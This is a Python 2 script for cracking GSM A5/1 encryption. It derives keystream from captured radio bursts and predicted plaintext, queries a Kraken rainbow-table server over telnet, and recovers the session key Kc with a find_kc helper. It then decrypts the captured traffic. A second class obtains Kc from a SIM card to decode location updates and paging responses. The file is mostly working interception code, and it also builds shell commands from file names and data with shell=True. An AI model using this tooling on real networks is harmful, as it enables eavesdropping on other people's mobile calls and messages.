#!/usr/bin/python

import telnetlib
import subprocess
import re
import random
import io
import sys
import os, fcntl, fcntl, termios, termios

from lxml import etree
from lxml import objectify
from io import FileIO
from binascii import *
from card.utils import *
from card.SIM import SIM

from time import sleep

class capturedecode(object):
    def SmartCardGetKcFromRand(self, rand, pin=None):
	s= SIM()
	if not s:
		print "Error opening SIM"
		exit(1)

        if pin:
            s.verify_pin(pin)

        rand_bin= stringToByte(a2b_hex(rand))

	print "\nGSM Authentication"
	ret = s.run_gsm_alg(rand_bin)
	return b2a_hex(byteToString(ret[1]))

    def SmartDecode( self, capture_file, pin=None ):
        out= subprocess.check_output(" ./captures/location_updates %s" % (capture_file,), shell=True)
        lines= out.split("\n")
        print lines

        frameno= 0
        tmsi= ""
        rand= ""
        results={}
        for line in lines:
            if frameno and tmsi and rand:
                if tmsi not in results:
                    results[tmsi]= { frameno: {"kc": self.SmartCardGetKcFromRand(rand, pin), "frameno": [frameno,] }}
                else:
                    results[tmsi][frameno]= {"kc":  self.SmartCardGetKcFromRand(rand, pin), "frameno": [frameno,]}
                print "KC:", results[tmsi][frameno]["kc"]

                frameno= 0
                tmsi= ""
                rand= ""

            result= re.search('(\d+)\s+0x([0-9abcdef]+)', line)
            if result:
                frameno= int(result.group(1))
                tmsi= result.group(2)
                print "TMSI:", tmsi
                print "FRAMENO:", frameno

                continue

            if tmsi:
                result= re.search("([0-9abcdef:]{47})", line)
                if result:
                    rand= result.group(1).replace(":", "")
                    print "RAND:", rand

        out= subprocess.check_output("./captures/paging_responses %s" % (capture_file,), shell=True)
        lines= out.split("\n")
        print lines

        for line in lines:
            result= re.search('(\d+)\s+0x([0-9abcdef]+)', line)
            if not result:
                continue

            frameno= int(result.group(1))
            tmsi= result.group(2)

            if tmsi not in results:
                continue

            closest_lu_frameno= min(filter(lambda x:frameno>x,results[tmsi].keys()), key=lambda x:abs(frameno-x))

            if int(frameno) in results[tmsi][closest_lu_frameno]["frameno"]:
                    continue
            results[tmsi][closest_lu_frameno]["frameno"].append(int(frameno))

        for tmsi in results:
            for lu_frameno in results[tmsi]:
                for frameno in results[tmsi][lu_frameno]["frameno"]:
                    self.DecodeBursts( frameno, results[tmsi][lu_frameno]["kc"] )

    def DecodeBursts( self, frameno, kc ):
        max= sys.maxint
        result= None

        files= os.listdir(".")
        for file in files:
            if ".dat" in file:
                bursts_info= file.split("_")
                frameno2= int(bursts_info[4])
                if abs(frameno-frameno2)<max:
                    max= abs(frameno-frameno2)
                    result= file

        if result:
            print result
            c=gsmcrack(result)

            print "Decoded bursts", result
            print c.DecodeData(kc)

class gsmcrack(object):
    def ErrorRate( self, ul ):
        rates= self.data.xpath("/scan/frame[@cipher='0' and @uplink='%d']/error" % ul)
        sum= 0
        for e in rates:
            sum+= e

        return sum/len(rates)

    def xor( self, b1, b2 ):
        r=""
        for i in range(114):
            a = ord(b1[i])
            b = ord(b2[i])
            r = r+chr(48^a^b)

        return r

    def DecodeData( self, kc ):
        frames= self.data.xpath("/scan/frame")
        data= []
        for frame in frames:
            data.append(self.RunDecodeBursts( frame, kc ))

        return data

    def CrackData( self, PredictFile=None ):
        uplink= True
        downlink= True

        print str(len(self.data.xpath("/scan/frame"))), "frames avalible", 

        #Check if uplink or downlink data was too nasty for beeing decoded or
        #if there were too many errors
        if( len(self.data.xpath("/scan/frame[@cipher='0' and @uplink='1']/data"))!=
            len(self.data.xpath("/scan/frame[@cipher='0' and @uplink='1']")) or
            self.ErrorRate(1)>0.02 ):
            print "Ignoring uplink"
            uplink= False
        if( len(self.data.xpath("/scan/frame[@cipher='0' and @uplink='0']/data"))!=
            len(self.data.xpath("/scan/frame[@cipher='0' and @uplink='0']")) or
            self.ErrorRate(0)>0.02 ):
            print "Ignoring downlink"
            downlink= False
        if( not uplink and not downlink ):
            print "Too mouch errors"
            return False

        if not PredictFile:
            print "Predict file not specified"
            return False

        frames= self.data.xpath("/scan/frame[@cipher='1']")
        print "Cracking %d encripted frames." % (len(frames),)

        with open(PredictFile) as f:
                content = f.readlines()
                print "We are guessing:\n", "".join(content)

                for (i,line) in enumerate(content):
                    print "Trying frame no %d" % (i,)
                    if "skip" in line:
                        print "Skipping frame"
                        continue

                    print "Frame is uplink? %s" % (frames[i].attrib["uplink"],)

                    if int(frames[i].attrib["uplink"]) and not uplink:
                        print "No uplink so we are skipping"
                        continue

                    if not int(frames[i].attrib["uplink"]) and not downlink:
                        print "No downlink so we are skipping"
                        continue

                    print "Cracking frame %d with data %s" % (i, line)
                    result= self.CrackFrame( frames[i], line.replace(' ','').strip() )
                    if result:
                        return result

        return False

    def CrackFrame( self, frame, data ):
        key_result= False
        plaintexts= self.RunEncodeBursts(data)

        bursts= frame.xpath("burst")

        #Take all samples
        for i in random.sample(range(0,len(bursts)), len(bursts)):
            print "Using burst", i
            try:
                keystream= self.xor(bursts[i].cyphertext.text.strip(),plaintexts[i].strip())
            except:
                continue
            results= self.RunKraken(keystream)
            if results:
                print "Kraken was sucesfull"
                for result in results:
                    if i+2>=len(bursts):
                        a=-1
                    else:
                        a= 1

                    test= random.sample(range(0,len(bursts)), len(bursts))
                    del test[test.index(i)]
                    for j in test:
                        print "Trying to find Kc for burst", j
                        keystream= self.xor(bursts[j].cyphertext.text.strip(), plaintexts[j].strip())
                        key_result= self.RunFindKc( result[0], result[1],
                                int(bursts[i].attrib["fn"]), int(bursts[j].attrib["fn"]),
                                keystream )
                        if key_result:
                            return key_result

                    print "We give up, continue..."

        return False

    def RunEncodeBursts( self, data ):
        result= objectify.parse(io.StringIO(unicode(subprocess.check_output( "./burst_encode --data %s" % (data,),  shell=True))))
        result= result.xpath("/frame/burst/text()")

        return result

    def RunDecodeBursts( self, frame, kc ) :
        out=""
        for burst in frame.xpath("burst"):
            out+= "--burst %s " % (burst.cyphertext.text.strip(),)

        try:
            main_params= "./burst_decode -i 127.0.0.1 --ul %d --fn %d -t %d " % (int(frame.attrib["uplink"]), int(frame.xpath("burst")[0].attrib["fn"]), int(frame.chan_type),)
        except:
            print "Error:", sys.exc_info()[0]
            return None

        main_params+= out

        if int(frame.attrib["cipher"])==1:
            result= subprocess.check_output(main_params + " --kc " + kc, shell=True)
        else:
            result= subprocess.check_output(main_params , shell=True)

        result= re.search("RAW\sDATA:\s+([0-9abcdef ]+)", result)
        if result:
            return result.group(1)

        print "Error decoding", main_params, "with kc", kc

        return None

    def GetFrameCount( self, frameno):
        t1= int(frameno)/1326
        t2= int(frameno) % 26
        t3= int(frameno) % 51

        return (t1<<11)|(t3<<5)|t2

    def RunFindKc( self, key, offset, frameno1, frameno2, keystream):
        framecount1= self.GetFrameCount(frameno1)
        framecount2= self.GetFrameCount(frameno2)

        print "Trying to find kc for key %s, offset %d, framecount1 %d, \
              framecount2 %d and keystream %s" % (key, offset, framecount1,
                      framecount2, keystream )

        result= subprocess.check_output("./find_kc %s %d %d %d %s" % 
                (key, offset, framecount1, framecount2, keystream), shell=True)
        result = re.search('([0-9abcdef ]+) \*\*\* MATCHED \*\*\*', result)
        if result:
            print "Kc was found"
            return result.group(1).replace(" ", "").strip()

        print "Kc was not found"
        return False

    def RunKraken( self, keystream ):
        print "Running kraken for keystream", keystream

        tn= telnetlib.Telnet(self.kraken_ip, self.kraken_port)

        try:
            sleep(2)
            tn.write("crack %s\r\n" % keystream)
        except:
            return []

        id= -1
        result=[]
        while 1:
            try:
                (index, match, text)= tn.expect([
                       'Found\s+([0-9abcdef]+)\s+@\s+([0-9]+)\s+#([0-9]+)',
                       'crack\s+#([0-9]+)\s+took\s+([0-9]+)\s+msec',
                       'Cracking\s+#([0-9]+)\s+([01]+)',
                      ], 400)
            except:
                break

            if index==-1:
                if id==-1:
                    tn.write("crack %s\r\n" % keystream)
                    continue
                break
            elif index==2 and match.group(2) in keystream:
                id=match.group(1)
                print "Crack id is:", id
            elif index==1:
                if match.group(1)==id:
                    print "End of crack:", id
                    break
            elif index==0:
                if match.group(3)==id:
                    print "New result for crack:", id, match.group(1), match.group(2)
                    result.append((match.group(1),int(match.group(2)),))

        tn.close()
        return result

    def __init__( self, filename, kraken_ip="localhost", kraken_port=5555 ):
        self.data= objectify.parse(FileIO(filename))
        self.kraken_ip= kraken_ip
        self.kraken_port= kraken_port

if __name__ == "__main__":
    a=gsmcrack(sys.argv[1], "localhost", 5555)
    KC= a.CrackData(sys.argv[2])
    print "KC:", KC

    if KC:
        print "Decoding data..."
        a.DecodeData(KC)

